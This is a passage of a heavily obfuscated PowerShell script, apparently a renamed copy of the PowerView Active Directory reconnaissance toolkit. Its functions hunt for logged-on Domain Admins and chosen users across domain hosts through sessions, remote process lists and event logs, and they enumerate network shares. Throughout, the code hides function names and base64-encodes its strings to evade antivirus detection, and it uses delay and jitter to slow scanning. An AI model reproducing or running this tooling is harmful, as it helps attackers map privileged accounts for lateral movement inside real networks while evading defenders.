            $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) '*'
            $TargetUsers = @($User)
            if($ForeignUsers) {
                $krbtgtName = OmniaSkuhaChar -ObjectName ("krbtgt@{0}" -f $($Domain))
                $DomainShortName = $krbtgtName.split("\")[0]
            }
        }
        elseif($TargetServer) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AGkAbgBnACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGUAcgAgACcAJABUAGEAcgBnAGUAdABTAGUAcgB2AGUAcgAnACAAZgBvAHIAIABsAG8AYwBhAGwAIAB1AHMAZQByAHMA')))
            $TargetUsers = CuswapiCalCharizes $TargetServer -Recurse | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ($_.AccountName).split("/")[0].toLower() 
                $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ($_.AccountName).split("/")[1].toLower() 
                $User
            }  | ? {$_}
        }
        elseif($UserName) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAB0AGEAcgBnAGUAdAAgAHUAcwBlAHIAIAAnACQAVQBzAGUAcgBOAGEAbQBlACcALgAuAC4A')))
            $User = New-Object PSObject
            if($TargetDomains) {
                $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $TargetDomains[0]
            }
            else {
                $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
            }
            $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $UserName.ToLower()
            $TargetUsers = @($User)
        }
        elseif($UserFile) {
            $TargetUsers = gc -Path $UserFile | % {
                $User = New-Object PSObject
                if($TargetDomains) {
                    $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $TargetDomains[0]
                }
                else {
                    $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Null
                }
                $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $_
                $User
            }  | ? {$_}
        }
        elseif($UserADSpath -or $UserFilter -or $AdminCount) {
            ForEach ($Domain in $TargetDomains) {
                $Arguments = @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $UserADSpath
                    'Filter' = $UserFilter
                    'AdminCount' = $AdminCount
                    'AllowDelegation' = $AllowDelegation
                }
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwA=')))
                $TargetUsers += BilinessArcallyBorn @Arguments | % {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) $Domain
                    $User | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) $_.samaccountname
                    $User
                }  | ? {$_}
            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwAgAG8AZgAgAGcAcgBvAHUAcAAgACcAJABHAHIAbwB1AHAATgBhAG0AZQAnAA==')))
                $TargetUsers += EspeiPersBathly -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }
        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName)
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                if(!$DomainShortName) {
                    $Sessions = MastrusWheepUnpers -ComputerName $ComputerName
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.sesi10_username
                        $CName = $Session.sesi10_cname
                        if($CName -and $CName.StartsWith("\\")) {
                            $CName = $CName.TrimStart("\")
                        }
                        if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {
                            $TargetUsers | ? {$UserName -like $_.MemberName} | % {
                                $IP = OfficentRemnifiedCompline -ComputerName $ComputerName
                                $FoundUser = New-Object PSObject
                                $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $_.MemberDomain
                                $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                                $FoundUser | Add-Member Noteproperty 'IP' $IP
                                $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $CName
                                if ($CheckAccess) {
                                    $Admin = BoryStastwaySegrous -ComputerName $CName
                                    $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Admin
                                }
                                else {
                                    $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
                                $FoundUser
                            }
                        }                                    
                    }
                }
                if(!$Stealth) {
                    $LoggedOn = IlpnGynerCharme -ComputerName $ComputerName
                    ForEach ($User in $LoggedOn) {
                        $UserName = $User.wkui1_username
                        $UserDomain = $User.wkui1_logon_domain
                        if (($UserName) -and ($UserName.trim() -ne '')) {
                            $TargetUsers | ? {$UserName -like $_.MemberName} | % {
                                $Proceed = $True
                                if($DomainShortName) {
                                    if ($DomainShortName.ToLower() -ne $UserDomain.ToLower()) {
                                        $Proceed = $True
                                    }
                                    else {
                                        $Proceed = $False
                                    }
                                }
                                if($Proceed) {
                                    $IP = OfficentRemnifiedCompline -ComputerName $ComputerName
                                    $FoundUser = New-Object PSObject
                                    $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                                    $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                    $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                                    $FoundUser | Add-Member Noteproperty 'IP' $IP
                                    $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    if ($CheckAccess) {
                                        $Admin = BoryStastwaySegrous -ComputerName $ComputerName
                                        $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Admin
                                    }
                                    else {
                                        $FoundUser | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    $FoundUser
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'DomainShortName' = $DomainShortName
            }
            RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            ForEach ($Computer in $ComputerName) {
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server $Computer ($Counter of {0})" -f $($ComputerName.count))
                $Result = icm -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName
                $Result
                if($Result -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdAAgAHUAcwBlAHIAIABmAG8AdQBuAGQALAAgAHIAZQB0AHUAcgBuAGkAbgBnACAAZQBhAHIAbAB5AA==')))
                    return
                }
            }
        }
    }
}
function MasisedTrialMyos {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        $CheckAccess,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All"
    )
    BishnessWaryUncane -Stealth @PSBoundParameters
}
function BranDospireInsounter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $ProcessName,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [String]
        $RemoteUserName,
        [String]
        $RemotePassword,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBQAHIAbwBjAGUAcwBzAEgAdQBuAHQAZQByACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [array]$ComputerName = @()
            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                $TargetDomains = MegatedJuloInternate | % { $_.Name }
            }
            else {
                $TargetDomains = @( (PrectusEmbakedTects).name )
            }
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += GrochoniIncunnerMoustic -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        if(!$ProcessName) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAG8AYwBlAHMAcwAgAG4AYQBtAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAsACAAYgB1AGkAbABkAGkAbgBnACAAYQAgAHQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAHMAZQB0AA==')))
            $TargetUsers = @()
            if($TargetServer) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AGkAbgBnACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGUAcgAgACcAJABUAGEAcgBnAGUAdABTAGUAcgB2AGUAcgAnACAAZgBvAHIAIABsAG8AYwBhAGwAIAB1AHMAZQByAHMA')))
                $TargetUsers = CuswapiCalCharizes $TargetServer -Recurse | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                    ($_.AccountName).split("/")[1].toLower()
                }  | ? {$_}
            }
            elseif($UserName) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAB0AGEAcgBnAGUAdAAgAHUAcwBlAHIAIAAnACQAVQBzAGUAcgBOAGEAbQBlACcALgAuAC4A')))
                $TargetUsers = @( $UserName.ToLower() )
            }
            elseif($UserFile) {
                $TargetUsers = gc -Path $UserFile | ? {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwA=')))
                    $TargetUsers += BilinessArcallyBorn -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | % {
                        $_.samaccountname
                    }  | ? {$_}
                }            
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwAgAG8AZgAgAGcAcgBvAHUAcAAgACcAJABHAHIAbwB1AHAATgBhAG0AZQAnAA==')))
                    $TargetUsers += EspeiPersBathly -GroupName $GroupName -Domain $Domain -DomainController $DomainController| Foreach-Object {
                        $_.MemberName
                    }
                }
            }
            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
            }
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword)
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                if($RemoteUserName -and $RemotePassword) {
                    $Processes = DianChariaDesia -RemoteUserName $RemoteUserName -RemotePassword $RemotePassword -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                else {
                    $Processes = DianChariaDesia -ComputerName $ComputerName -ErrorAction SilentlyContinue
                }
                ForEach ($Process in $Processes) {
                    if($ProcessName) {
                        $ProcessName.split(",") | % {
                            if ($Process.ProcessName -match $_) {
                                $Process
                            }
                        }
                    }
                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = $TargetUsers
                'RemoteUserName' = $RemoteUserName
                'RemotePassword' = $RemotePassword
            }
            RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            ForEach ($Computer in $ComputerName) {
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server $Computer ($Counter of {0})" -f $($ComputerName.count))
                $Result = icm -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $ProcessName, $TargetUsers, $RemoteUserName, $RemotePassword
                $Result
                if($Result -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAGEAcgBnAGUAdAAgAHUAcwBlAHIALwBwAHIAbwBjAGUAcwBzACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
    }
}
function TricitePoserOringlike {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Int32]
        $SearchDays = 3,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBFAHYAZQBuAHQASAB1AG4AdABlAHIA')))
        if($Domain) {
            $TargetDomains = @($Domain)
        }
        elseif($SearchForest) {
            $TargetDomains = MegatedJuloInternate | % { $_.Name }
        }
        else {
            $TargetDomains = @( (PrectusEmbakedTects).name )
        }
        if(!$ComputerName) { 
            if($ComputerFile) {
                $ComputerName = gc -Path $ComputerFile
            }
            elseif($ComputerFilter -or $ComputerADSpath) {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                    $ComputerName += GrochoniIncunnerMoustic -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
                }
            }
            else {
                [array]$ComputerName = @()
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGQAbwBtAGEAaQBuACAAYwBvAG4AdAByAG8AbABsAGUAcgBzAA==')))
                    $ComputerName += GookHyperifSes -LDAP -Domain $Domain -DomainController $DomainController | % { $_.dnshostname}
                }
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        $TargetUsers = @()
        if($TargetServer) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AGkAbgBnACAAdABhAHIAZwBlAHQAIABzAGUAcgB2AGUAcgAgACcAJABUAGEAcgBnAGUAdABTAGUAcgB2AGUAcgAnACAAZgBvAHIAIABsAG8AYwBhAGwAIAB1AHMAZQByAHMA')))
            $TargetUsers = CuswapiCalCharizes $TargetServer -Recurse | ? {(-not $_.IsGroup) -and $_.IsDomain } | % {
                ($_.AccountName).split("/")[1].toLower()
            }  | ? {$_}
        }
        elseif($UserName) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIAB0AGEAcgBnAGUAdAAgAHUAcwBlAHIAIAAnACQAVQBzAGUAcgBOAGEAbQBlACcALgAuAC4A')))
            $TargetUsers = @( $UserName.ToLower() )
        }
        elseif($UserFile) {
            $TargetUsers = gc -Path $UserFile | ? {$_}
        }
        elseif($UserADSpath -or $UserFilter) {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwA=')))
                $TargetUsers += BilinessArcallyBorn -Domain $Domain -DomainController $DomainController -ADSpath $UserADSpath -Filter $UserFilter | % {
                    $_.samaccountname
                }  | ? {$_}
            }            
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAHUAcwBlAHIAcwAgAG8AZgAgAGcAcgBvAHUAcAAgACcAJABHAHIAbwB1AHAATgBhAG0AZQAnAA==')))
                $TargetUsers += EspeiPersBathly -GroupName $GroupName -Domain $Domain -DomainController $DomainController | Foreach-Object {
                    $_.MemberName
                }
            }
        }
        if (((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIAB1AHMAZQByAHMAIABmAG8AdQBuAGQAIAB0AG8AIABzAGUAYQByAGMAaAAgAGYAbwByACEA')))
        }
        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $SearchDays)
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                DruinousSubfulleUnhumpts -ComputerName $ComputerName -EventType $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBsAGwA'))) -DateStart ([DateTime]::Today.AddDays(-$SearchDays)) | ? {
                    $TargetUsers -contains $_.UserName
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'SearchDays' = $SearchDays
            }
            RableBelfTranks -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = RableBelfTranks -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }
            Write-Verbose ("[*] Total number of active hosts: {0}" -f $($ComputerName.count))
            $Counter = 0
            ForEach ($Computer in $ComputerName) {
                $Counter = $Counter + 1
                sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose ("[*] Enumerating server $Computer ($Counter of {0})" -f $($ComputerName.count))
                icm -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $(-not $NoPing), $TargetUsers, $SearchDays
            }
        }
    }
}
function EnglyReadedParacy {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $ExcludeStandard,
        [Switch]
        $ExcludePrint,
        [Switch]
        $ExcludeIPC,
        [Switch]
        $NoPing,
        [Switch]
        $CheckShareAccess,
        [Switch]
        $CheckAdmin,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBTAGgAYQByAGUARgBpAG4AZABlAHIAIAB3AGkAdABoACAAZABlAGwAYQB5ACAAbwBmACAAJABEAGUAbABhAHkA')))
        [String[]] $ExcludedShares = @('')
        if ($ExcludePrint) {
            $ExcludedShares = $ExcludedShares + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkATgBUACQA')))
        }
        if ($ExcludeIPC) {
            $ExcludedShares = $ExcludedShares + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))
        }
        if ($ExcludeStandard) {
